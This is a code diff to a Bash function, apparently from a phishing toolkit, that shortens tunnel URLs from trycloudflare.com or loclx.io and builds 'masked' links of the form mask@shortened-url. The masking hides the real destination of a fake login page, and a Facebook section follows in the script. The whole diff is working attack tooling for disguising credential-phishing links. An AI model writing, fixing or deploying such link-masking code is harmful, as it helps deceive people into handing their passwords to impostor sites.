@@ -581,27 +581,19 @@ custom_url() {
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
 	{ custom_mask; sleep 1; clear; banner_small; }
-	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
-		if [[ $(site_stat $isgd) == 2* ]]; then
-			shorten $isgd "$url"
-		elif [[ $(site_stat $shortcode) == 2* ]]; then
-			shorten $shortcode "$url"
-		else
-			shorten $tinyurl "$url"
-		fi
+if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
+    shorten "$url"
+    processed_url=${processed_url%\"} # Remove trailing quote
+    processed_url=${processed_url#\"} # Remove leading quote
+    masked_url="$mask@$processed_url"
+else
+    url="Unable to generate links. Try after turning on hotspot"
+    processed_url="Unable to Short URL"
+fi
 
-		url="https://$url"
-		masked_url="$mask@$processed_url"
-		processed_url="https://$processed_url"
-	else
-		# echo "[!] No url provided / Regex Not Matched"
-		url="Unable to generate links. Try after turning on hotspot"
-		processed_url="Unable to Short URL"
-	fi
-
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
-	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
+echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
+echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
+[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
 }
 
 ## Facebook
